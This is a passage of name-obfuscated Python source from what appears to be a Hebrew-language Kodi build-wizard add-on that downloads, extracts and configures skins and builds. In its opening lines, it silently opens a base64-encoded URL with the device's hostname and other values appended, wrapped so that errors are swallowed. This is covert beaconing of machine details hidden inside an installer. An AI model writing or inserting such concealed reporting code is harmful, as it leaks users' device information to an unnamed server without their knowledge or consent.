          O000OOO0OOO0OO000 =O000OO0O0OOO00000 #line:3387
          OO00O0OO0O0OO0000 =OO000000O0O0O00O0 #line:3388
          import socket #line:3389
          OO00OO0OO0OOOO00O =urllib2 .urlopen (OOO0OO0OOOOOOO0O0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O000OOO0OOO0OO000 +' - '+OO00O0OO0O0OO0000 +' - '+OO00OOO0O0O0OOO00 +' - '+O000O0O00000O0O00 ).readlines ()#line:3390
       except :pass #line:3392
def skinfix18 ():#line:3393
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3394
		OO00000OOOOOOO0OO =wiz .workingURL (SKINID18DDONXML )#line:3395
		if OO00000OOOOOOO0OO ==True :#line:3396
			OO0O0OO00000OO0O0 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3397
			if len (OO0O0OO00000OO0O0 )>0 :#line:3398
				OOO0OOO00OO0O00OO ='%s-%s.zip'%(SKINID18 ,OO0O0OO00000OO0O0 [0 ])#line:3399
				O0O0O0O0O0OO000O0 =wiz .workingURL (SKIN18ZIPURL +OOO0OOO00OO0O00OO )#line:3400
				if O0O0O0O0O0OO000O0 ==True :#line:3401
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3402
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3403
					O0OOOOO0OO0OO00OO =os .path .join (PACKAGES ,OOO0OOO00OO0O00OO )#line:3404
					try :os .remove (O0OOOOO0OO0OO00OO )#line:3405
					except :pass #line:3406
					downloader .download (SKIN18ZIPURL +OOO0OOO00OO0O00OO ,O0OOOOO0OO0OO00OO ,DP )#line:3407
					extract .all (O0OOOOO0OO0OO00OO ,HOME ,DP )#line:3408
					try :#line:3409
						O0OO0000O0OO000O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3410
						O0OOO00000OO00O00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3411
						os .rename (O0OO0000O0OO000O0 ,O0OOO00000OO00O00 )#line:3412
					except :#line:3413
						pass #line:3414
					try :#line:3415
						O0O0O0O0O00O00O00 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O000O00OO00OO0O00 =O0O0O0O0O00O00O00 .read ();O0O0O0O0O00O00O00 .close ()#line:3416
						OO0OOOOO0OO0O0OOO =wiz .parseDOM (O000O00OO00OO0O00 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3417
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOOOO0OO0O0OOO [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3418
					except :#line:3419
						pass #line:3420
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3421
					DP .close ()#line:3422
					xbmc .sleep (500 )#line:3423
					wiz .forceUpdate (True )#line:3424
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3425
				else :#line:3426
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3427
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0O0O0O0O0OO000O0 ,xbmc .LOGERROR )#line:3428
			else :#line:3429
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3430
		else :#line:3431
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3432
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3433
def skinfix17 ():#line:3434
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3435
		OO000OO0OOO000OOO =wiz .workingURL (SKINID17DDONXML )#line:3436
		if OO000OO0OOO000OOO ==True :#line:3437
			O0OOOO0000O0000OO =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3438
			if len (O0OOOO0000O0000OO )>0 :#line:3439
				OOO0O00000OOOO00O ='%s-%s.zip'%(SKINID17 ,O0OOOO0000O0000OO [0 ])#line:3440
				O0000OOO000000O0O =wiz .workingURL (SKIN17ZIPURL +OOO0O00000OOOO00O )#line:3441
				if O0000OOO000000O0O ==True :#line:3442
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3443
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3444
					OOO0OOO00O0O00000 =os .path .join (PACKAGES ,OOO0O00000OOOO00O )#line:3445
					try :os .remove (OOO0OOO00O0O00000 )#line:3446
					except :pass #line:3447
					downloader .download (SKIN17ZIPURL +OOO0O00000OOOO00O ,OOO0OOO00O0O00000 ,DP )#line:3448
					extract .all (OOO0OOO00O0O00000 ,HOME ,DP )#line:3449
					try :#line:3450
						OOO0OOOOOOOO0O0OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3451
						OO0O0OOOOO0OO00O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3452
						os .rename (OOO0OOOOOOOO0O0OO ,OO0O0OOOOO0OO00O0 )#line:3453
					except :#line:3454
						pass #line:3455
					try :#line:3456
						OOOOO00OOO0OO00OO =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O00O00000OOOO0O0O =OOOOO00OOO0OO00OO .read ();OOOOO00OOO0OO00OO .close ()#line:3457
						OOOOO000O00O0OO00 =wiz .parseDOM (O00O00000OOOO0O0O ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3458
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOO000O00O0OO00 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3459
					except :#line:3460
						pass #line:3461
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3462
					DP .close ()#line:3463
					xbmc .sleep (500 )#line:3464
					wiz .forceUpdate (True )#line:3465
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3466
				else :#line:3467
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3468
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0000OOO000000O0O ,xbmc .LOGERROR )#line:3469
			else :#line:3470
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3471
		else :#line:3472
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3473
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3474
def fix17update ():#line:3475
	if KODIV >=17 and KODIV <18 :#line:3476
		wiz .kodi17Fix ()#line:3477
		xbmc .sleep (4000 )#line:3478
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3479
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3480
		fixfont ()#line:3481
		O000O0OOOO0O0OO0O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3482
		try :#line:3484
			OO00O00OO0OOO0OO0 =open (O000O0OOOO0O0OO0O ,'r')#line:3485
			O0O000OOOOOO0OOO0 =OO00O00OO0OOO0OO0 .read ()#line:3486
			OO00O00OO0OOO0OO0 .close ()#line:3487
			OOO00O0OO00O00000 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3488
			O00000O0000OOO00O =re .compile (OOO00O0OO00O00000 ).findall (O0O000OOOOOO0OOO0 )[0 ]#line:3489
			OO00O00OO0OOO0OO0 =open (O000O0OOOO0O0OO0O ,'w')#line:3490
			OO00O00OO0OOO0OO0 .write (O0O000OOOOOO0OOO0 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O00000O0000OOO00O ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3491
			OO00O00OO0OOO0OO0 .close ()#line:3492
		except :#line:3493
				pass #line:3494
		wiz .kodi17Fix ()#line:3495
		O000O0OOOO0O0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3496
		try :#line:3497
			OO00O00OO0OOO0OO0 =open (O000O0OOOO0O0OO0O ,'r')#line:3498
			O0O000OOOOOO0OOO0 =OO00O00OO0OOO0OO0 .read ()#line:3499
			OO00O00OO0OOO0OO0 .close ()#line:3500
			OOO00O0OO00O00000 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3501
			O00000O0000OOO00O =re .compile (OOO00O0OO00O00000 ).findall (O0O000OOOOOO0OOO0 )[0 ]#line:3502
			OO00O00OO0OOO0OO0 =open (O000O0OOOO0O0OO0O ,'w')#line:3503
			OO00O00OO0OOO0OO0 .write (O0O000OOOOOO0OOO0 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O00000O0000OOO00O ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3504
			OO00O00OO0OOO0OO0 .close ()#line:3505
		except :#line:3506
				pass #line:3507
		swapSkins ('skin.Premium.mod')#line:3508
def fix18update ():#line:3510
	if KODIV >=18 :#line:3511
		xbmc .sleep (4000 )#line:3512
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3513
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3514
		fixfont ()#line:3515
		O0OOO00OOOOO0OOOO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3516
		try :#line:3517
			OO00OOOOO0O000000 =open (O0OOO00OOOOO0OOOO ,'r')#line:3518
			O00O0OOO0OOOOO00O =OO00OOOOO0O000000 .read ()#line:3519
			OO00OOOOO0O000000 .close ()#line:3520
			OOO0O0O0OOO00OOO0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3521
			O00O000OOOO00O0OO =re .compile (OOO0O0O0OOO00OOO0 ).findall (O00O0OOO0OOOOO00O )[0 ]#line:3522
			OO00OOOOO0O000000 =open (O0OOO00OOOOO0OOOO ,'w')#line:3523
			OO00OOOOO0O000000 .write (O00O0OOO0OOOOO00O .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O00O000OOOO00O0OO ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3524
			OO00OOOOO0O000000 .close ()#line:3525
		except :#line:3526
				pass #line:3527
		wiz .kodi17Fix ()#line:3528
		O0OOO00OOOOO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3529
		try :#line:3530
			OO00OOOOO0O000000 =open (O0OOO00OOOOO0OOOO ,'r')#line:3531
			O00O0OOO0OOOOO00O =OO00OOOOO0O000000 .read ()#line:3532
			OO00OOOOO0O000000 .close ()#line:3533
			OOO0O0O0OOO00OOO0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3534
			O00O000OOOO00O0OO =re .compile (OOO0O0O0OOO00OOO0 ).findall (O00O0OOO0OOOOO00O )[0 ]#line:3535
			OO00OOOOO0O000000 =open (O0OOO00OOOOO0OOOO ,'w')#line:3536
			OO00OOOOO0O000000 .write (O00O0OOO0OOOOO00O .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O00O000OOOO00O0OO ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3537
			OO00OOOOO0O000000 .close ()#line:3538
		except :#line:3539
				pass #line:3540
		swapSkins ('skin.Premium.mod')#line:3541
def buildWizard (O0O000O00OO000OO0 ,O00OOOOOO000OOOOO ,theme =None ,over =False ):#line:3544
	if over ==False :#line:3545
		OOO00OOO00O000OO0 =wiz .checkBuild (O0O000O00OO000OO0 ,'url')#line:3546
		if OOO00OOO00O000OO0 ==False :#line:3548
			xbmc .executebuiltin ((u'Notification(%s,%s)'%('Media Center','אנא המתן')))#line:3552
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.mediacenter/?mode=install&name=+Kodi+Media+Center&url=gui)")#line:3553
			return #line:3554
		OOOO0O00OO0O0OO0O =wiz .workingURL (OOO00OOO00O000OO0 )#line:3555
		if OOOO0O00OO0O0OO0O ==False :#line:3556
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OOOO0O00OO0O0OO0O ))#line:3557
			return #line:3558
	if O00OOOOOO000OOOOO =='gui':#line:3559
		if O0O000O00OO000OO0 ==BUILDNAME :#line:3560
			if over ==True :O00OO00000O00OOO0 =1 #line:3561
			else :O00OO00000O00OOO0 =1 #line:3562
		else :#line:3563
			O00OO00000O00OOO0 =1 #line:3564
		if O00OO00000O00OOO0 :#line:3565
			remove_addons ()#line:3566
			remove_addons2 ()#line:3567
			O000O00000O00OOOO =wiz .checkBuild (O0O000O00OO000OO0 ,'gui')#line:3568
			OOOO00O000O0000O0 =O0O000O00OO000OO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3569
			if not wiz .workingURL (O000O00000O00OOOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3570
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3571
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O000O00OO000OO0 ),'','אנא המתן')#line:3572
			OO0OOOOOOOO000OO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOO00O000O0000O0 )#line:3573
			try :os .remove (OO0OOOOOOOO000OO0 )#line:3574
			except :pass #line:3575
			logging .warning (O000O00000O00OOOO )#line:3576
			if 'google'in O000O00000O00OOOO :#line:3577
			   OOOOOO000O0OO0O00 =googledrive_download (O000O00000O00OOOO ,OO0OOOOOOOO000OO0 ,DP ,wiz .checkBuild (O0O000O00OO000OO0 ,'filesize'))#line:3578
			else :#line:3581
			  downloader .download (O000O00000O00OOOO ,OO0OOOOOOOO000OO0 ,DP )#line:3582
			xbmc .sleep (100 )#line:3583
			OOO0000O0OO0O00OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O000O00OO000OO0 )#line:3584
			DP .update (0 ,OOO0000O0OO0O00OO ,'','אנא המתן')#line:3585
			extract .all (OO0OOOOOOOO000OO0 ,HOME ,DP ,title =OOO0000O0OO0O00OO )#line:3586
			DP .close ()#line:3587
			wiz .defaultSkin ()#line:3588
			wiz .lookandFeelData ('save')#line:3589
			wiz .kodi17Fix ()#line:3590
			if INSTALLMETHOD ==1 :O00OOO00OO0OOO0OO =1 #line:3592
			elif INSTALLMETHOD ==2 :O00OOO00OO0OOO0OO =0 #line:3593
			else :DP .close ()#line:3594
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3595
		else :#line:3597
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3598
	if O00OOOOOO000OOOOO =='gui2':#line:3599
		if O0O000O00OO000OO0 ==BUILDNAME :#line:3600
			if over ==True :O00OO00000O00OOO0 =1 #line:3601
			else :O00OO00000O00OOO0 =1 #line:3602
		else :#line:3603
			O00OO00000O00OOO0 =1 #line:3604
		if O00OO00000O00OOO0 :#line:3605
			remove_addons ()#line:3606
			remove_addons2 ()#line:3607
			O000O00000O00OOOO =wiz .checkBuild (O0O000O00OO000OO0 ,'gui')#line:3608
			OOOO00O000O0000O0 =O0O000O00OO000OO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3609
			if not wiz .workingURL (O000O00000O00OOOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3610
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3611
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O000O00OO000OO0 ),'','אנא המתן')#line:3612
			OO0OOOOOOOO000OO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOO00O000O0000O0 )#line:3613
			try :os .remove (OO0OOOOOOOO000OO0 )#line:3614
			except :pass #line:3615
			logging .warning (O000O00000O00OOOO )#line:3616
			if 'google'in O000O00000O00OOOO :#line:3617
			   OOOOOO000O0OO0O00 =googledrive_download (O000O00000O00OOOO ,OO0OOOOOOOO000OO0 ,DP ,wiz .checkBuild (O0O000O00OO000OO0 ,'filesize'))#line:3618
			else :#line:3621
			  downloader .download (O000O00000O00OOOO ,OO0OOOOOOOO000OO0 ,DP )#line:3622
			xbmc .sleep (100 )#line:3623
			OOO0000O0OO0O00OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O000O00OO000OO0 )#line:3624
			DP .update (0 ,OOO0000O0OO0O00OO ,'','אנא המתן')#line:3625
			extract .all (OO0OOOOOOOO000OO0 ,HOME ,DP ,title =OOO0000O0OO0O00OO )#line:3626
			DP .close ()#line:3627
			wiz .defaultSkin ()#line:3628
			wiz .lookandFeelData ('save')#line:3629
			if INSTALLMETHOD ==1 :O00OOO00OO0OOO0OO =1 #line:3632
			elif INSTALLMETHOD ==2 :O00OOO00OO0OOO0OO =0 #line:3633
			else :DP .close ()#line:3634
		else :#line:3636
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3637
	elif O00OOOOOO000OOOOO =='fresh':#line:3638
		freshStart (O0O000O00OO000OO0 )#line:3639
	elif O00OOOOOO000OOOOO =='normal':#line:3640
		if url =='normal':#line:3641
			if KEEPTRAKT =='true':#line:3642
				traktit .autoUpdate ('all')#line:3643
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3644
			if KEEPREAL =='true':#line:3645
				debridit .autoUpdate ('all')#line:3646
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3647
			if KEEPLOGIN =='true':#line:3648
				loginit .autoUpdate ('all')#line:3649
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:3650
		OO0OO0O00000O0OO0 =int (KODIV );OOO0OOOO0000O0O00 =int (float (wiz .checkBuild (O0O000O00OO000OO0 ,'kodi')))#line:3651
		if not OO0OO0O00000O0OO0 ==OOO0OOOO0000O0O00 :#line:3652
			if OO0OO0O00000O0OO0 ==16 and OOO0OOOO0000O0O00 <=15 :O0O0O0O0OOOOO000O =False #line:3653
			else :O0O0O0O0OOOOO000O =True #line:3654
		else :O0O0O0O0OOOOO000O =False #line:3655
		if O0O0O0O0OOOOO000O ==True :#line:3656
			OOO0OOO00OO000OO0 =1 #line:3657
		else :#line:3658
			if not over ==False :OOO0OOO00OO000OO0 =1 #line:3659
			else :OOO0OOO00OO000OO0 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:3660
		if OOO0OOO00OO000OO0 :#line:3661
			wiz .clearS ('build')#line:3662
			O000O00000O00OOOO =wiz .checkBuild (O0O000O00OO000OO0 ,'url')#line:3663
			OOOO00O000O0000O0 =O0O000O00OO000OO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3664
			if not wiz .workingURL (O000O00000O00OOOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3665
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3666
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O000O00OO000OO0 ,wiz .checkBuild (O0O000O00OO000OO0 ,'version')),'','אנא המתן')#line:3667
			OO0OOOOOOOO000OO0 =os .path .join (PACKAGES ,'%s.zip'%OOOO00O000O0000O0 )#line:3668
			try :os .remove (OO0OOOOOOOO000OO0 )#line:3669
			except :pass #line:3670
			logging .warning (O000O00000O00OOOO )#line:3671
			if 'google'in O000O00000O00OOOO :#line:3672
			   OOOOOO000O0OO0O00 =googledrive_download (O000O00000O00OOOO ,OO0OOOOOOOO000OO0 ,DP ,wiz .checkBuild (O0O000O00OO000OO0 ,'filesize'))#line:3673
			else :#line:3676
			  downloader .download (O000O00000O00OOOO ,OO0OOOOOOOO000OO0 ,DP )#line:3677
			xbmc .sleep (1000 )#line:3678
			OOO0000O0OO0O00OO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O000O00OO000OO0 ,wiz .checkBuild (O0O000O00OO000OO0 ,'version'))#line:3679
			DP .update (0 ,OOO0000O0OO0O00OO ,'','Please Wait')#line:3680
			OOO000O0OOOOOO0OO ,OOO0000O00O000OO0 ,OOO0000O00O0O0OO0 =extract .all (OO0OOOOOOOO000OO0 ,HOME ,DP ,title =OOO0000O0OO0O00OO )#line:3681
			if int (float (OOO000O0OOOOOO0OO ))>0 :#line:3682
				wiz .fixmetas ()#line:3683
				wiz .lookandFeelData ('save')#line:3684
				wiz .defaultSkin ()#line:3685
				wiz .setS ('buildname',O0O000O00OO000OO0 )#line:3687
				wiz .setS ('buildversion',wiz .checkBuild (O0O000O00OO000OO0 ,'version'))#line:3688
				wiz .setS ('buildtheme','')#line:3689
				wiz .setS ('latestversion',wiz .checkBuild (O0O000O00OO000OO0 ,'version'))#line:3690
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:3691
				wiz .setS ('installed','true')#line:3692
				wiz .setS ('extract',str (OOO000O0OOOOOO0OO ))#line:3693
				wiz .setS ('errors',str (OOO0000O00O000OO0 ))#line:3694
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOO000O0OOOOOO0OO ,OOO0000O00O000OO0 ))#line:3695
				fastupdatefirstbuild (NOTEID )#line:3698
				skinfix18 ()#line:3699
				try :os .remove (OO0OOOOOOOO000OO0 )#line:3701
				except :pass #line:3702
				if int (float (OOO0000O00O000OO0 ))>0 :#line:3705
					O00OO00000O00OOO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O000O00OO000OO0 ,wiz .checkBuild (O0O000O00OO000OO0 ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOO000O0OOOOOO0OO ,'%',COLOR1 ,OOO0000O00O000OO0 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:3706
					if O00OO00000O00OOO0 :#line:3707
						if isinstance (OOO0000O00O000OO0 ,unicode ):#line:3708
							OOO0000O00O0O0OO0 =OOO0000O00O0O0OO0 .encode ('utf-8')#line:3709
						wiz .TextBox (ADDONTITLE ,OOO0000O00O0O0OO0 )#line:3710
				DP .close ()#line:3711
				O000OOOO00000O000 =wiz .themeCount (O0O000O00OO000OO0 )#line:3712
				indicator ()#line:3713
				if not O000OOOO00000O000 ==False :#line:3714
					buildWizard (O0O000O00OO000OO0 ,'theme')#line:3715
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:3716
				if INSTALLMETHOD ==1 :O00OOO00OO0OOO0OO =1 #line:3717
				elif INSTALLMETHOD ==2 :O00OOO00OO0OOO0OO =0 #line:3718
				else :resetkodi ()#line:3719
				if O00OOO00OO0OOO0OO ==1 :wiz .reloadFix ()#line:3721
				else :wiz .killxbmc (True )#line:3722
			else :#line:3723
				if isinstance (OOO0000O00O000OO0 ,unicode ):#line:3724
					OOO0000O00O0O0OO0 =OOO0000O00O0O0OO0 .encode ('utf-8')#line:3725
				O0OO0O00OO0O000OO =open (OO0OOOOOOOO000OO0 ,'r')#line:3726
				OOOOO0000OOO0OO0O =O0OO0O00OO0O000OO .read ()#line:3727
				O0000000O00OO0O0O =''#line:3728
				for O0O000OOO0OO00OO0 in OOOOOO000O0OO0O00 :#line:3729
				  O0000000O00OO0O0O ='key: '+O0000000O00OO0O0O +'\n'+O0O000OOO0OO00OO0 #line:3730
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OOO0000O00O0O0OO0 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+O0000000O00OO0O0O )#line:3731
		else :#line:3732
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:3733
	elif O00OOOOOO000OOOOO =='theme':#line:3734
		if theme ==None :#line:3735
			O000OOOO00000O000 =wiz .checkBuild (O0O000O00OO000OO0 ,'theme')#line:3736
			O00O0OOOOO00O00O0 =[]#line:3737
			if not O000OOOO00000O000 =='http://'and wiz .workingURL (O000OOOO00000O000 )==True :#line:3738
				O00O0OOOOO00O00O0 =wiz .themeCount (O0O000O00OO000OO0 ,False )#line:3739
				if len (O00O0OOOOO00O00O0 )>0 :#line:3740
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O0O000O00OO000OO0 ,COLOR1 ,len (O00O0OOOOO00O00O0 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:3741
						wiz .log ("Theme List: %s "%str (O00O0OOOOO00O00O0 ))#line:3742
						OOOO0000OOOOOOO00 =DIALOG .select (ADDONTITLE ,O00O0OOOOO00O00O0 )#line:3743
						wiz .log ("Theme install selected: %s"%OOOO0000OOOOOOO00 )#line:3744
						if not OOOO0000OOOOOOO00 ==-1 :theme =O00O0OOOOO00O00O0 [OOOO0000OOOOOOO00 ];OO0O0O00OOO000OOO =True #line:3745
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3746
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3747
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:3748
		else :OO0O0O00OOO000OOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O0O000O00OO000OO0 ,wiz .checkBuild (O0O000O00OO000OO0 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:3749
		if OO0O0O00OOO000OOO :#line:3750
			OOOOO000O0O0OO0OO =wiz .checkTheme (O0O000O00OO000OO0 ,theme ,'url')#line:3751
			OOOO00O000O0000O0 =O0O000O00OO000OO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3752
			if not wiz .workingURL (OOOOO000O0O0OO0OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:3753
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3754
